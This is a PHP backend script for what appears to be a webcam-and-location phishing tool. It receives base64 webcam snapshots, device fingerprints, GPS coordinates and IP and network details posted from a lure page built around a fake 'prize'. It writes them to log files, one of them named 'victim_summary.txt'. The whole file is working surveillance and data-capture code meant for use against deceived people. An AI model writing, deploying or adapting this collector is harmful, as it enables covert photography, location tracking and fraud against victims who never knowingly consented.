<?php

$date = date('dMYHis');

if (!file_exists('logs')) {
    mkdir('logs', 0777, true);
}

if (!empty($_POST['cat'])) {
    $imageData = $_POST['cat'];
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    
    $fp = fopen('cam_' . $date . '.png', 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);
    
    error_log("[" . $date . "] Image captured\n", 3, "logs/capture_log.txt");
}

if (!empty($_POST['device_data'])) {
    $deviceData = json_decode($_POST['device_data'], true);
    $deviceLog = "=== DEVICE INFO [" . $date . "] ===\n";
    $deviceLog .= "User Agent: " . ($deviceData['userAgent'] ?? 'N/A') . "\n";
    $deviceLog .= "Platform: " . ($deviceData['platform'] ?? 'N/A') . "\n";
    $deviceLog .= "Language: " . ($deviceData['language'] ?? 'N/A') . "\n";
    $deviceLog .= "Screen: " . ($deviceData['screenResolution'] ?? 'N/A') . "\n";
    $deviceLog .= "Timezone: " . ($deviceData['timezone'] ?? 'N/A') . "\n";
    $deviceLog .= "Hardware Concurrency: " . ($deviceData['hardwareConcurrency'] ?? 'N/A') . "\n";
    $deviceLog .= "Device Memory: " . ($deviceData['deviceMemory'] ?? 'N/A') . "\n";
    $deviceLog .= "========================\n\n";
    
    file_put_contents('logs/device_info.txt', $deviceLog, FILE_APPEND);
}

if (!empty($_POST['location_data'])) {
    $locationData = json_decode($_POST['location_data'], true);
    $locationLog = "=== LOCATION INFO [" . $date . "] ===\n";
    $locationLog .= "Latitude: " . ($locationData['lat'] ?? 'N/A') . "\n";
    $locationLog .= "Longitude: " . ($locationData['lng'] ?? 'N/A') . "\n";
    $locationLog .= "Accuracy: " . ($locationData['accuracy'] ?? 'N/A') . " meters\n";
    $locationLog .= "Address: " . ($locationData['address'] ?? 'N/A') . "\n";
    $locationLog .= "City: " . ($locationData['city'] ?? 'N/A') . "\n";
    $locationLog .= "Country: " . ($locationData['country'] ?? 'N/A') . "\n";
    $locationLog .= "========================\n\n";
    
    file_put_contents('logs/location_info.txt', $locationLog, FILE_APPEND);
    
    $csvLine = $date . "," . 
               ($locationData['lat'] ?? '') . "," . 
               ($locationData['lng'] ?? '') . "," . 
               ($locationData['accuracy'] ?? '') . "," . 
               ($locationData['city'] ?? '') . "," . 
               ($locationData['country'] ?? '') . "\n";
    
    file_put_contents('logs/gps_coordinates.csv', $csvLine, FILE_APPEND);
}

if (!empty($_POST['network_data'])) {
    $networkData = json_decode($_POST['network_data'], true);
    $networkLog = "=== NETWORK INFO [" . $date . "] ===\n";
    $networkLog .= "IP Address: " . ($networkData['ip'] ?? 'N/A') . "\n";
    $networkLog .= "Connection Type: " . ($networkData['type'] ?? 'N/A') . "\n";
    $networkLog .= "Effective Type: " . ($networkData['effectiveType'] ?? 'N/A') . "\n";
    $networkLog .= "Downlink: " . ($networkData['downlink'] ?? 'N/A') . " Mbps\n";
    $networkLog .= "RTT: " . ($networkData['rtt'] ?? 'N/A') . " ms\n";
    $networkLog .= "========================\n\n";
    
    file_put_contents('logs/network_info.txt', $networkLog, FILE_APPEND);
}

if (!empty($_POST['enhanced_payload'])) {
    $enhancedData = json_decode($_POST['enhanced_payload'], true);
    $completeLog = "=== COMPLETE CAPTURE [" . $date . "] ===\n";
    $completeLog .= json_encode($enhancedData, JSON_PRETTY_PRINT);
    $completeLog .= "\n================================\n\n";
    
    file_put_contents('logs/complete_captures.json', $completeLog, FILE_APPEND);
}

if (!empty($_POST['periodic_update'])) {
    $updateLog = "=== PERIODIC UPDATE [" . $date . "] ===\n";
    $updateLog .= "Capture Count: " . ($_POST['captureCount'] ?? 'N/A') . "\n";
    $updateLog .= "========================\n\n";
    
    file_put_contents('logs/periodic_updates.txt', $updateLog, FILE_APPEND);
}

if (!empty($_POST['event'])) {
    $eventLog = "=== EVENT: " . $_POST['event'] . " [" . $date . "] ===\n";
    $eventLog .= "Timestamp: " . ($_POST['timestamp'] ?? 'N/A') . "\n";
    
    if (!empty($_POST['prize'])) {
        $eventLog .= "Prize: $" . $_POST['prize'] . "\n";
        $eventLog .= "Range: $" . $_POST['min'] . " - $" . $_POST['max'] . "\n";
    }
    
    if (!empty($_POST['finalCaptureCount'])) {
        $eventLog .= "Total Captures: " . $_POST['finalCaptureCount'] . "\n";
    }
    
    $eventLog .= "========================\n\n";
    
    file_put_contents('logs/events.txt', $eventLog, FILE_APPEND);
}

if (!empty($_POST['device_data']) || !empty($_POST['location_data'])) {
    $summaryLine = $date . " | ";
    
    if (!empty($_POST['location_data'])) {
        $loc = json_decode($_POST['location_data'], true);
        $summaryLine .= ($loc['city'] ?? 'Unknown') . ", " . ($loc['country'] ?? 'Unknown');
    } else {
        $summaryLine .= "Location Unknown";
    }
    
    $summaryLine .= " | " . ($_POST['capture_id'] ?? '0') . " captures\n";
    file_put_contents('logs/victim_summary.txt', $summaryLine, FILE_APPEND);
}

header('Content-Type: application/json');
echo json_encode(['status' => 'success', 'message' => 'Data received']);

exit();
?>